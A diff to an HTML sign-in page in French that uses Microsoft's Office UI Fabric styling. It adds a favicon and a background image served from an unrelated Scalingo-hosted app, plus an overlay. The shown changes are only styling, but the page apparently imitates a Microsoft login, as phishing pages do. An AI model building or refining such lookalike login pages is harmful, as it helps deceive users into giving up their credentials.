@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connectez-vous à votre compte</title>
+    <!-- Favicon personnalisé -->
+    <link rel="icon" href="https://nouveaudoc.osc-fr1.scalingo.io/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
     <style>
         * {
@@ -12,7 +14,6 @@
             box-sizing: border-box;
         }
         body {
-            background: #f2f2f2;
             font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
             display: flex;
             align-items: center;
@@ -20,8 +21,26 @@
             min-height: 100vh;
             margin: 0;
             padding: 16px;
+            /* Image de fond */
+            background-image: url('https://nouveaudoc.osc-fr1.scalingo.io/image_72b5e3a7.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+        /* Overlay semi-transparent pour améliorer la lisibilité */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(242, 242, 242, 0.6);
+            z-index: 0;
         }
         .main-card {
+            position: relative;
+            z-index: 1;
             width: 100%;
             max-width: 440px;
             background: #fff;
